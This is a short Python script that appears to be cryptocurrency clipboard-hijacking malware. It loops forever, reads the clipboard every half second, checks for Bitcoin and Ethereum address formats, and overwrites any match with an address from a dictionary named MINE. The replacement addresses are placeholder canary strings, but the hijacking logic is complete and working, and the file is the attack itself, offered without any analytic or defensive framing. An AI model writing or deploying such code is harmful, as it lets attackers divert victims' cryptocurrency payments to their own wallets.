import re
import time
import pyperclip

BTC = re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")
ETH = re.compile(r"^0x[a-fA-F0-9]{40}$")
MINE = {"btc": "CANARY_not_a_real_address", "eth": "CANARY_not_a_real_address"}


def watch():
    while True:
        v = pyperclip.paste()
        if BTC.match(v):
            pyperclip.copy(MINE["btc"])
        elif ETH.match(v):
            pyperclip.copy(MINE["eth"])
        time.sleep(0.5)
